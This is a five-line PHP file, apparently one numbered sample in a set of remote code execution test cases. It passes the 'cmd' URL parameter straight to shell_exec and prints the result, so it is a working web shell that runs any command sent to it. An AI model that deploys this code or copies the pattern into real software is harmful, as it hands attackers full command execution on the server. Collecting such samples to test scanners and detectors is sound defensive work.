<?php
// RCE test variation #91
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>